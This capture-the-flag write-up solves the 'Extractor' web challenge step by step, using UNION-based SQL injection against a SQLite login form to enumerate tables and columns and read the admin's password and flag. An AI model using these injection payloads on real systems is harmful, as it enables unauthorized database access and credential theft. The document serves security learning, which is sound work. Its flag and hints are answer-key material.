# Extractor

When we visit challenge URL we get following response

![image](https://user-images.githubusercontent.com/86155751/183261192-f97ee77f-3037-4b5a-bf69-d412981ea60b.png)

Looking everything does gave any thing back. Let's register a user name sahil, pass sahil and content sahil. And login with it we get as below profile page.

![image](https://user-images.githubusercontent.com/86155751/183261253-89bb6ca5-c685-4312-8748-3dc3ec932d3f.png)

Nothing intresting...Knock the brain and one thing to try out at such register/login related problem where database is involved is SQL.

Starting with ' to check out if some error occour.

![image](https://user-images.githubusercontent.com/86155751/183261371-5aca8020-781f-487a-8e06-8f57cae67231.png)

![image](https://user-images.githubusercontent.com/86155751/183261385-af0f3185-a08b-436c-ab75-59bdfe6d226f.png)

Now tring some SQL payloads and observing responses.
- sahil' order by 2000;--

![image](https://user-images.githubusercontent.com/86155751/183261417-f30acca3-f18d-4605-9110-533f564242eb.png)

![image](https://user-images.githubusercontent.com/86155751/183261424-61620da2-8b29-4d73-a932-96a6d817e991.png)

We observe that 4 coloumns exists.

- sahil' union select 1,2,3,4;--

![image](https://user-images.githubusercontent.com/86155751/183261468-42c86987-cde5-4ca0-aff4-b5310f9be58b.png)

![image](https://user-images.githubusercontent.com/86155751/183261477-3e660cac-4fc6-4443-9afe-ad88bdc815ac.png)

So we can inject payloads at position 2,3,4

- sahil' union select 1,sqlite_version(),3,4;--

![image](https://user-images.githubusercontent.com/86155751/183261510-973690c8-5efb-4331-8869-be9ad5f3131b.png)

![image](https://user-images.githubusercontent.com/86155751/183261516-d4c96cd9-024d-4aa6-b441-7ef60e14314f.png)

We see that version is sqlite 3.35.5 

- sahil' union SELECT 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';--

![image](https://user-images.githubusercontent.com/86155751/183261572-c8e60c70-d8bd-49db-89de-5a705c8abf83.png)

![image](https://user-images.githubusercontent.com/86155751/183261562-a0f364e1-7de3-400b-8973-2e5b33111637.png)

Getting the table names in database we got Admins,users

- sahil' union SELECT 1,sql,3,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name='Admins';--

![image](https://user-images.githubusercontent.com/86155751/183261635-f4fad6c8-929c-4668-9401-578bc154b315.png)

![image](https://user-images.githubusercontent.com/86155751/183261624-25344a94-e923-45de-bccd-5023f0add99f.png)

We got coloumn names - id,user,pass,content

- sahil' union SELECT 1,user,3,4 from Admins;--

![image](https://user-images.githubusercontent.com/86155751/183261692-68c1ad02-a8a4-4e1c-b653-a91d4efc338f.png)

![image](https://user-images.githubusercontent.com/86155751/183261700-a2cff96e-66f8-4752-86f2-f45ad3a60b5f.png)

There exists a user named Adminnn let's read password for it

- sahil' union SELECT 1,user,pass,content from Admins;--

![image](https://user-images.githubusercontent.com/86155751/183261751-808c2f20-ad5e-463e-b285-46db2fdda2ff.png)

![image](https://user-images.githubusercontent.com/86155751/183261760-12577a32-1cbb-410a-b73c-f4f629cc6ed6.png)

We got the flag finally :- shellctf{Sql_1Nj3c7i0n_B45iC_XD}

Hints with point values (cost) :-
- Hint 1 :--- A sample query :-username' union select 1,sqlite_version(),3,4;-- (50 pts)
- Hint 1 :--- Look in Admins table with username Adminnn  (70 pts)


